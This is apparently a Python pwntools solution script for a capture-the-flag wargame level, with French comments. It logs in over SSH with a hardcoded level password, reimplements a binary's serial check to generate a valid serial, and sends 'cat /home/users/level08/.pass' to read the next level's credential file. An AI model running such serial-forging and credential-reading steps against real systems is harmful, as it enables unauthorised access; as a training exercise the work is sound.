#!/usr/bin/env python3
from pwn import *
import base64
import os


# Configuration
context.arch = 'i386'  # Architecture du binaire (32-bit)
context.log_level = 'info'  # Niveau de log (debug, info, warning, error)

# Variables pour la connexion
LOCAL = False  # Mettre à False pour l'exploitation SSH
HOST = "localhost"  # Hôte pour SSH
PORT = 8881  # Port pour SSH
USER = "level07"  # Nom d'utilisateur SSH
PASSWORD = "h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq"  # Mot de passe SSH
SSH_SESSION = None


def get_connection(custom_env=None, argv=None):
    global SSH_SESSION
    # Fonction helper pour fusionner les environnements
    def merge_env(base_env, custom_env):
        if custom_env:
            base_env.update(custom_env)
        return base_env

    if LOCAL:
        # En local, on utilise l'environnement actuel comme base
        SSH_SESSION = None
        local_env = os.environ.copy()
        final_env = merge_env(local_env, custom_env)
        final_argv = argv if argv is not None else ['./Resources/' + USER]
        return process(final_argv, env=final_env)
    else:
        shell = ssh(host=HOST, port=PORT, user=USER, password=PASSWORD)
        SSH_SESSION = shell
        # Récupérer l'environnement distant
        remote_env = shell.run('env').recvall().decode().strip()
        # Convertir l'output en dictionnaire
        remote_env_dict = dict(line.split('=', 1) for line in remote_env.split('\n') if '=' in line)

        # Fusionner avec nos variables personnalisées 
        final_env = merge_env(remote_env_dict, custom_env)
        final_argv = argv if argv is not None else ['/home/users/' + USER + '/' + USER]
        log.info(f"Final argv: {final_argv}")
        return shell.process(final_argv, env=final_env)


def xore(data):
    # On s'assure que 'data' est un bytearray pour pouvoir le modifier (b"aa" → bytearray(b"aa"))
    if isinstance(data, bytes):
        data = bytearray(data)
    for i in range(len(data)):
        if data[i] > 64 and data[i] <= 90:
            data[i] ^= 32
    return bytes(data)



def calc_serial(login):
    """
    Calcule le serial à partir d'un login (simule la logique C du binaire level06/source.c).
    login : str (username, jusqu'à 32 caractères)
    Retourne : int (le serial "attendu" pour ce login)
    """
    login = login.rstrip('\n')
    login = login[:32]
    login_len = len(login)

    serial = (ord(login[3]) ^ 0x1337) + 0x5eeded
    for i in range(login_len):
        if ord(login[i]) < 0x20:
            return 1
        serial = serial + ((ord(login[i]) ^ serial) % 1337)
    return serial


def exploit():


    login = b"jerdos"

    serial = str(calc_serial(login.decode()))
    print(f"Serial: {serial}")

    conn = get_connection()

    if LOCAL:
        gdb.attach(conn, '''
          break *main
          continue
          ''')


    try:
        if not LOCAL:
            conn.recvuntil(b'$')
            conn.sendline('cat /home/users/level08/.pass')
            flag = conn.recvline()
            print("\n=== Flag ===")
            print(flag.decode())
            conn.interactive()

        # conn.interactive()

    except EOFError:
        print("EOFError")
        pass
    except Exception as e:
        print(e)
        pass
    finally:
        conn.close()


 

   
if __name__ == "__main__":
    exploit()


